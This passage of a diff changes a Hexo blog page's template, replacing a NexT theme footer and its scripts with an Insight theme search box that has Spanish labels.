+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Escribe algo...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-      </div>
-
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Threezh1</span>
 </div>
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Tags',
+                UNTITLED: '(Sin título)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-  </div>
-
-  
-  <script src="/lib/jquery/index.js?v=3.4.1"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
-<script src="/js/schemes/pisces.js?v=7.3.0"></script>
-<script src="/js/next-boot.js?v=7.3.0"></script>
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-
-  
-  <script src="/js/post-details.js?v=7.3.0"></script>
-
-
 </body>
 </html>
